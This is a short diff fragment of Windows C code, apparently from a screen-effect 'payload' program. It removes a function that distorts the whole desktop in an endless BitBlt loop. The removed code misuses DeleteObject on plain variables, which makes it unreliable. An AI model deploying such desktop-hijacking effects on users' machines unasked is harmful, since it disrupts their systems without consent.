@@ -187,23 +187,6 @@ DWORD WINAPI RGB2(LPVOID lpParam)
     }
 }
 
-DWORD WINAPI sines(LPVOID lpParam) {
-  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
-  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
-  double angle = 0;
-  while (1) {
-    desk = GetDC(0);
-    for (float i = 0; i < sw + sh; i += 0.99f) {
-      int a = sin(angle) * 20;
-      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
-      angle += M_PI / 40;
-      DeleteObject(&i); DeleteObject(&a);
-    }
-    ReleaseDC(wnd, desk);
-    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
-  }
-}
-
 DWORD WINAPI payload3(LPVOID lpParam) {
 	CreateThread(0, 0, RedrawCounter, 0, 0, 0);
 	HDC desk = GetDC(0);
